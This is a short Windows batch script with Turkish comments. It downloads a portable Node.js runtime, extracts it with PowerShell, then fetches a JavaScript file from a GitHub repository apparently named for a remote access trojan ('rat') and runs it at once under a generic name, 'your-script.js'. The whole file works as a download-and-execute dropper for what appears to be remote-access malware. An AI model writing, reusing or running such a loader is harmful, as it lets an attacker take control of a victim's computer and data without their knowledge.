@echo off
setlocal

:: Node.js indirme URL'i
set "nodeUrl=https://nodejs.org/dist/v16.3.0/node-v16.3.0-win-x64.zip"

:: Script dosyasının indirme URL'i
set "scriptUrl=https://raw.githubusercontent.com/murmurlab/rat/main/x.js"

:: İndirilecek dosyaların hedef konumu
set "downloadPath=%~dp0"

:: curl komutu kontrolü
set "curlCommand=curl"
where %curlCommand% >nul 2>&1 || set "curlCommand=."

:: Node.js indirme
echo Node.js indiriliyor...
%curlCommand% -o "%downloadPath%\node.zip" "%nodeUrl%"

:: Zip dosyasının çıkarılması
echo Zip dosyası çıkarılıyor...
powershell -command "Add-Type -A 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory('%downloadPath%\node.zip', '%downloadPath%')"

:: Script dosyasının indirilmesi
echo Script dosyası indiriliyor...
%curlCommand% -o "%downloadPath%\your-script.js" "%scriptUrl%"

:: Node.js'in çalıştırılması
echo Node.js çalıştırılıyor...
"%downloadPath%\node-v16.3.0-win-x64\node.exe" "%downloadPath%\your-script.js"

endlocal
